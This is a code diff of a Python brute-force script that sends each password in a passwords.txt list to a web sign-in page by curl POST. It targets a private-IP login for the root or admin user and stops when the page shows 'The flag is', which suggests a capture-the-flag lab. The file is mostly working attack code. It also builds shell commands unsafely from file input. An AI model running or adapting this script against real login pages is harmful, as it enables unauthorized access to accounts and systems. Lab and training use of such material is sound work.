@@ -1,25 +1,24 @@
-import os
+import subprocess  
+import re
 
-class BruteForce():
-    '''
-        Class created to run 10000 different passwords against the admin username on app
+def main():
+    print("-----------------------------------------------------------------------------")
+    print(f"Starting bruteforce attack on: http://10.203.68.74/index.php?page=signin")
 
-        Note: When combined with -X, --request, this option can be used to send a command instead, 
-        so the user may use the email's unique identifier to make the request.
-    '''
-    def __init__(self, file_path):
-        self.file_path = file_path
+    with open('./passwords.txt') as passwords:
+        print(f"    Using 'passwords.txt as input file.")
+        print(f"    Using curl with options -'-silent -X POST'")
+        print("-----------------------------------------------------------------------------")
 
-    def open_ressources(self):
-        return [item.replace("\n", "") for item in open(self.file_path).readlines()]
+        for password in passwords:
+            print(f"    Testing password: '{password[:-1]}'")
+           
+            http_response = subprocess.check_output(f"curl --silent -X POST 'http://10.203.68.74/index.php?page=signin&username=root&password={password[:-1]}&Login=Login'", shell=True)
 
-    def run_brute_force_attack(self):
-        self.passwords = self.open_ressources()
-        for password in self.passwords:
-            curl_command = "curl -X POST \"http://10.0.0.117/index.php?page=signin&username=admin&password=" + password + "&Login=Login\" | grep 'The flag is'"
-            # curl_command = "curl -X POST \"http://192.168.1.99/index.php?page=signin&username=admin&password=" + password + "&Login=Login\" | grep 'The flag is'"
-            os.system(curl_command)
+            if "The flag is" in str(http_response):
+                print(f"    " + re.findall(r'The flag is : \w+', str(http_response))[0])
+                break
 
 
-Brute = BruteForce('./passwords.txt')
-Brute.run_brute_force_attack()
+if __name__ == '__main__':
+    main()
